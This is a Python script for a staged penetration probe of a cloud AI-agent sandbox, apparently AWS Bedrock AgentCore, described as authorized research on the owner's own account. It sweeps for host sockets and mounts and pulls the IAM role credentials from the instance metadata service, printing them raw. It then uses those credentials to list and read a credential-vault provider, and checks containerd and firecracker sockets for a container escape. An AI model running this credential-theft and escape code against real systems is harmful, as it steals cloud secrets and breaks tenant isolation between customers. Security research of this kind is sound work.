"""
probe_stage4_xcust.py — Stage 4 cross-customer reach probe for 11-3.

Four sub-probes:
  (G) Filesystem socket sweep: find / -name '*.sock', /host/ + alternates
  (H) IMDS dynamic / instance-identity / cross-microVM leakage
  (I) #3747844 vault exfil chain re-test on modern substrate
  (J) ctr against alternate containerd paths + bonus host-side recon

Read-only. Authorized research; account owner is the test target.
"""

import os
import sys
import base64
import subprocess
import json


def _b64(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()


def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return {
            'rc': r.returncode,
            'stdout': r.stdout[:32 * 1024],
            'stderr': r.stderr[:8 * 1024],
        }
    except subprocess.TimeoutExpired:
        return {'rc': -1, 'stdout': b'', 'stderr': b'<timeout>'}
    except Exception as e:
        return {'rc': -2, 'stdout': b'', 'stderr': f'<{type(e).__name__}:{e}>'.encode()}


def _emit(label, result):
    print(f'{label}_RC={result["rc"]}')
    if result['stdout']:
        print(f'{label}_STDOUT={_b64(result["stdout"])}')
    if result['stderr']:
        print(f'{label}_STDERR={_b64(result["stderr"])}')


def stage_g():
    """Filesystem socket sweep + host paths."""
    print('=== G: socket sweep ===')
    _emit('G_FIND_SOCK', _run(
        ['find', '/', '-maxdepth', '6', '-name', '*.sock', '-print'], timeout=30))
    _emit('G_LS_HOST', _run(['ls', '-la', '/host/']))
    _emit('G_LS_HOST_RUN', _run(['ls', '-la', '/host/run/']))
    _emit('G_LS_HOST_VAR', _run(['ls', '-la', '/host/var/']))
    _emit('G_LS_HOST_PROC1', _run(['ls', '-la', '/host/proc/1/']))
    _emit('G_LS_VAR_RUN', _run(['ls', '-la', '/var/run/']))
    _emit('G_FIND_HOST', _run(
        ['find', '/', '-maxdepth', '4', '-name', 'host*', '-print',
         '!', '-path', '*proc*', '!', '-path', '*sys*'], timeout=20))
    # /opt/aws / /opt/amazon top-level — sometimes has sandbox-agent stuff
    _emit('G_LS_OPT_AWS', _run(['ls', '-la', '/opt/aws/']))
    _emit('G_LS_OPT_AMAZON', _run(['ls', '-la', '/opt/amazon/']))
    _emit('G_LS_OPT_AWS_SBA', _run(['ls', '-la', '/opt/aws/sandbox-agent/']))
    # Look for the container_filesystem_storage.img referenced in mountinfo
    _emit('G_LS_SBA_VAR', _run(['ls', '-la', '/opt/aws/sandbox-agent/var/']))
    # /dev/loop devices — might be our own ext4 image
    _emit('G_LS_DEV', _run(['ls', '-la', '/dev/']))
    _emit('G_LSBLK', _run(['lsblk', '-a']))


def stage_h():
    """IMDS dynamic data."""
    print('=== H: IMDS dynamic ===')
    # Mint a token first
    r = _run(['curl', '-s', '-m', '5', '-X', 'PUT',
              'http://169.254.169.254/latest/api/token',
              '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 60'])
    _emit('H_TOKEN', r)
    if r['rc'] != 0 or not r['stdout']:
        print('H_TOKEN_FAILED=1')
        return
    token = r['stdout'].strip().decode('utf-8', errors='replace')

    def _imds(path):
        return _run([
            'curl', '-s', '-m', '5',
            f'http://169.254.169.254{path}',
            '-H', f'X-aws-ec2-metadata-token: {token}'])

    for path in [
        '/latest/meta-data/iam/security-credentials/',
        '/latest/meta-data/instance-id',
        '/latest/meta-data/instance-type',
        '/latest/meta-data/local-ipv4',
        '/latest/meta-data/mac',
        '/latest/meta-data/placement/availability-zone',
        '/latest/meta-data/placement/region',
        '/latest/meta-data/placement/host-id',
        '/latest/dynamic/instance-identity/document',
        '/latest/dynamic/instance-identity/signature',
        '/latest/dynamic/instance-identity/pkcs7',
        '/latest/meta-data/tags/instance/',
        '/latest/meta-data/iam/info',
    ]:
        _emit(f'H_{path.replace("/", "_")}', _imds(path))


def stage_i():
    """#3747844 vault exfil re-test — get exec-role creds, call boto3 against
    bedrock-agentcore Identity vault, attempt to read the canary apikey
    provider that's already on the account."""
    print('=== I: vault exfil re-test ===')
    # IMDS exec-role-creds
    r = _run(['curl', '-s', '-m', '5', '-X', 'PUT',
              'http://169.254.169.254/latest/api/token',
              '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 60'])
    if r['rc'] != 0:
        print('I_TOKEN_FAILED=1')
        return
    token = r['stdout'].strip().decode('utf-8', errors='replace')
    # Get role name first
    role_r = _run(['curl', '-s', '-m', '5',
                   'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                   '-H', f'X-aws-ec2-metadata-token: {token}'])
    _emit('I_ROLE_LIST', role_r)
    role_name = role_r['stdout'].strip().decode('utf-8', errors='replace').splitlines()
    role_name = role_name[0] if role_name else 'execution_role'
    print(f'I_ROLE_NAME={_b64(role_name.encode())}')
    # Get creds
    creds_r = _run(['curl', '-s', '-m', '5',
                    f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}',
                    '-H', f'X-aws-ec2-metadata-token: {token}'])
    _emit('I_CREDS_RAW', creds_r)
    try:
        creds = json.loads(creds_r['stdout'].decode('utf-8', errors='replace'))
        akia = creds.get('AccessKeyId', '')[:6]
        print(f'I_AKIA_PREFIX={akia}')
        print(f'I_HAS_TOKEN={"Yes" if creds.get("Token") else "No"}')
    except Exception as e:
        print(f'I_CREDS_PARSE_ERR={type(e).__name__}:{e}')
        return

    # Try to call boto3 against bedrock-agentcore-control to list vault
    # providers — this is what #3747844 did from the harness perspective.
    try:
        # Set creds in env for boto3
        os.environ['AWS_ACCESS_KEY_ID'] = creds['AccessKeyId']
        os.environ['AWS_SECRET_ACCESS_KEY'] = creds['SecretAccessKey']
        os.environ['AWS_SESSION_TOKEN'] = creds['Token']
        # Avoid pulling in boto3 if not present; fallback to aws cli
        # Use SigV4 + raw HTTP for max portability
        import urllib.request, urllib.parse
        from botocore.auth import SigV4Auth
        from botocore.credentials import Credentials
        from botocore.awsrequest import AWSRequest

        cred = Credentials(creds['AccessKeyId'], creds['SecretAccessKey'],
                           creds['Token'])

        # ListApiKeyCredentialProviders — control plane
        url = 'https://bedrock-agentcore-control.us-east-1.amazonaws.com/api-key-credential-providers'
        req = AWSRequest(method='GET', url=url,
                         headers={'Content-Type': 'application/json'})
        SigV4Auth(cred, 'bedrock-agentcore', 'us-east-1').add_auth(req)
        prep = req.prepare()
        ureq = urllib.request.Request(prep.url, method='GET')
        for k, v in prep.headers.items():
            ureq.add_header(k, v)
        try:
            resp = urllib.request.urlopen(ureq, timeout=10)
            print(f'I_LIST_PROVIDERS_HTTP={resp.status}')
            print(f'I_LIST_PROVIDERS_BODY={_b64(resp.read()[:2000])}')
        except urllib.request.HTTPError as e:
            print(f'I_LIST_PROVIDERS_HTTP={e.code}')
            print(f'I_LIST_PROVIDERS_BODY={_b64(e.read()[:1000])}')

        # GetApiKeyCredentialProvider for the canary one
        provider_url = ('https://bedrock-agentcore-control.us-east-1.amazonaws.com'
                        '/api-key-credential-providers/acab088-vault-probe-apikey')
        req2 = AWSRequest(method='GET', url=provider_url,
                          headers={'Content-Type': 'application/json'})
        SigV4Auth(cred, 'bedrock-agentcore', 'us-east-1').add_auth(req2)
        prep2 = req2.prepare()
        ureq2 = urllib.request.Request(prep2.url, method='GET')
        for k, v in prep2.headers.items():
            ureq2.add_header(k, v)
        try:
            resp2 = urllib.request.urlopen(ureq2, timeout=10)
            print(f'I_GET_PROVIDER_HTTP={resp2.status}')
            print(f'I_GET_PROVIDER_BODY={_b64(resp2.read()[:2000])}')
        except urllib.request.HTTPError as e:
            print(f'I_GET_PROVIDER_HTTP={e.code}')
            print(f'I_GET_PROVIDER_BODY={_b64(e.read()[:1000])}')
    except Exception as e:
        print(f'I_BOTO_ERR={type(e).__name__}:{str(e)[:200]}')


def stage_j():
    """ctr against alternate containerd paths."""
    print('=== J: alternate containerd ===')
    for path in [
        '/host/run/containerd/containerd.sock',
        '/host/var/run/containerd/containerd.sock',
        '/run/host-containerd.sock',
        '/var/run/host-containerd/containerd.sock',
        '/run/firecracker.sock',
        '/host/var/lib/containerd',
    ]:
        _emit(f'J_LS_{path.replace("/", "_")}', _run(['ls', '-la', path]))
    # /proc/<pid>/root for the containerd process — if any. Walk all PIDs
    # again briefly.
    _emit('J_LS_HOST_PROC', _run(['ls', '-la', '/host/proc/']))
    # Just to be sure — sweep / for any 'fc' or 'firecracker' sockets
    _emit('J_FIND_FC', _run(
        ['find', '/', '-maxdepth', '5', '-name', '*firecracker*',
         '-o', '-name', '*fc-*'], timeout=15))
    # ListAgentRuntime instances visible to our exec role - cross customer?
    # We'll do this in stage_i via boto3 already.


def main():
    print('PROBE=stage4-xcust v1')
    for fn in (stage_g, stage_h, stage_i, stage_j):
        try:
            fn()
        except Exception as e:
            print(f'STAGE_{fn.__name__.upper()}_ERR={type(e).__name__}:{e}')
    print('END')


if __name__ == '__main__':
    main()
